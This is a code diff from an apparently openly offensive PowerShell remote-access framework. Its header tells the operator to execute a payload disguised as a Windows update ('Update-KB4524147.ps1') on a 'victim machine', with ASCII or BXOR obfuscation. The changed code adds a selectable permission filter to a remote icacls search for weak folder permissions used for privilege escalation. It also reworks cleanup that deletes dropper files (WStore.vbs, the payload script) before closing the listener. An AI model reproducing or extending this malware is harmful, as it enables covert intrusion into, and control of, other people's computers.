@@ -18,11 +18,9 @@
    ----------------
    1 = ASCII
    2 = BXOR
-   3 = Base64
 
    Obfuscation: 2
  
-
  .EXECUTE PAYLOAD:
     Execute the output or 'Update-KB4524147.ps1' on the victim machine.
  
@@ -472,8 +470,10 @@ While($Client.Connected)
         {
           write-host " List Folder(s) Weak Permissions Recursive [ Everyone:(F) ]." -ForegroundColor Blue -BackgroundColor White;
           write-host " - Input Remote Folder Path (`$env:tmp): " -NoNewline;
-          $RfPath = Read-Host;Write-Host "`n`n";
-          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"(F)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ Everyone:(F) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
+          $RfPath = Read-Host;
+          write-host " - Sellect Attrib to Search (F|M): " -NoNewline;
+          $Attrib = Read-Host;Write-Host "`n`n";
+          $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"Everyone:`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ Everyone:($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
@@ -1462,8 +1462,10 @@ While($Client.Connected)
         cmd /R rmdir /Q /S "%LocalAppData%\webroot\";
         $bath = "$IPATH"+"WStore.vbs";
         $bathtwo = "$IPATH"+"$payload_name.ps1";
-        cmd /R del /Q /F "$bath";
-        cmd /R del /Q /F "$bathtwo";
+        $ck_one = Test-Path -Path "$bath";
+        $ck_two = Test-Path -Path "$bathtwo";
+        If($ck_one -eq $True){write-host " [i] Deleted: '$bath'" -ForegroundColor Yellow;cmd /R del /Q /F "$bath"}
+        If($ck_two -eq $True){write-host " [i] Deleted: '$bathtwo'" -ForegroundColor Yellow;cmd /R del /Q /F "$bathtwo"}
       }
       Start-Sleep -Seconds 3;
       $Socket.Stop();
